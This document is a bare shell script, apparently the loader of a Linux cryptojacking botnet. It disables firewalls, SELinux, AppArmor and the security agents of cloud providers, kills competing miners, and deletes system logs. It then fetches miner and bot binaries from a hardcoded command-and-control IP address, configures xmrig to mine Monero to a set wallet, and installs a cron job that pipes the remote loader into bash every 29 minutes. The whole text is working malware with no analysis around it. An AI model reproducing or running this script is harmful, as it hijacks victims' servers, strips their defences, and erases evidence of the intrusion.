cc=http://45.145.185.85
xmr=network001
sys=sysrv002

# kill old files
pkill -9 "^network01$"; pkill -9 sysrv001; pkill -9 "^sysrv$"

test -f /bin/ps.original && cp /bin/ps.original /bin/ps
#mv /bin/iptables /bin/iptables__

kill_other_miners() {
    a='kinsing kdevtmpfsi masscan watchdogs redis2 /var/lib/ups phpupdate phpguard networkmanager sysupdate sysguard networkservice svcupdate svcguard svcworkmanager svcupdates pnscan /tmp/java'
    for i in $a; do
        pkill -9 $i
    done
    chattr -i /etc/ld.so.preload; rm -rf /etc/ld.so.preload

    # kill high cpu usage proc
    ps axf -o "pid %cpu" | awk '{if($2>=35.0) print $1}' | while read pid; do
        cat /proc/$pid/cmdline | grep -a -E "$sys|$xmr"
        if [ $? -ne 0 ]; then
            kill -9 $pid
        fi
    done

    # remove docker xmr image
    a='pocosow gakeaws azulu auto xmr mine monero slowhttp bash.shell entrypoint.sh /var/sbin/bash'
    for i in $a; do
        docker ps | grep $i | awk '{print $1}' | xargs -I % docker kill %
    done
    a='pocosow gakeaws azulu auto xmr mine monero slowhttp buster-slim hello- registry'
    for i in $a; do
        docker images -a | grep $i | awk '{print $3}' | xargs -I % docker rmi -f %
    done
}

get() {
    chattr -i $2; rm -rf $2
    curl -fsSL $1 > $2 || wget -q -O - $1 > $2 || php -r "file_put_contents('$2', file_get_contents('$1'));"
    chmod +x $2
}

clean_system() {
    ulimit -n 65535
    chattr -iua /tmp/
    chattr -iua /var/tmp/
    chattr -R -i /var/spool/cron
    chattr -i /etc/crontab
    ufw disable
    iptables -F
    sysctl kernel.nmi_watchdog=0
    echo 0 >/proc/sys/kernel/nmi_watchdog
    echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
    rm -rf /var/log/syslog /tmp/* /usr/local/aegis /tmp/flag.txt /tmp/log.txt

    # remove aliyun yunjing
    if ps aux | grep -i '[a]liyun'; then
        curl http://update.aegis.aliyun.com/download/uninstall.sh | bash
        curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
        pkill aliyun-service
        rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service /usr/local/aegis*
        systemctl stop aliyun.service
        systemctl disable aliyun.service
        service bcm-agent stop
        yum remove bcm-agent -y
        apt-get remove bcm-agent -y
    elif ps aux | grep -i '[y]unjing'; then
        /usr/local/qcloud/stargate/admin/uninstall.sh
        /usr/local/qcloud/YunJing/uninst.sh
        /usr/local/qcloud/monitor/barad/admin/uninstall.sh
    fi

    systemctl stop c3pool_miner.service
    setenforce 0
    echo SELINUX=disabled >/etc/selinux/config
    service apparmor stop
    systemctl disable apparmor
    service aliyun.service stop
    systemctl disable aliyun.service
    ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
}

clean_system
kill_other_miners
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /

# setup xmr
sysctl -w vm.nr_hugepages=`nproc --all`
ps -fe | grep $xmr | grep -v grep
if [ $? -ne 0 ]; then
    # write config.json for xmrig
    chattr -i config.json; rm -rf config.json; echo '{
    "autosave": false, "watch": false, "donate-level": 0, "pools": [
        {"keepalive": true, "url": "xmr.f2pool.com:13531", "user": "49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa.linux", "pass": "x"}
    ]
}' > config.json
    if [ $(getconf LONG_BIT) = 64 ]; then
        get $cc/xmr64 $xmr
    else
        get $cc/xmr32 $xmr
    fi
    nohup ./$xmr 1>/dev/null 2>&1 &
fi

# setup sys
ps -fe | grep $sys | grep -v grep
if [ $? -ne 0 ]; then
    get $cc/sysrv $sys
    nohup ./$sys 1>/dev/null 2>&1 &
fi

# persistent
chattr -R -ia /var/spool/cron
chattr -ia /etc/crontab
chattr -R -ia /var/spool/cron/crontabs
chattr -R -ia /etc/cron.d
crontab -r
echo "*/29 * * * * (curl -fsSL $cc/ldr.sh || wget -q -O - $cc/ldr.sh) | bash>/dev/null 2>&1" | crontab -

sleep 3; rm -rf $sys config.json $xmr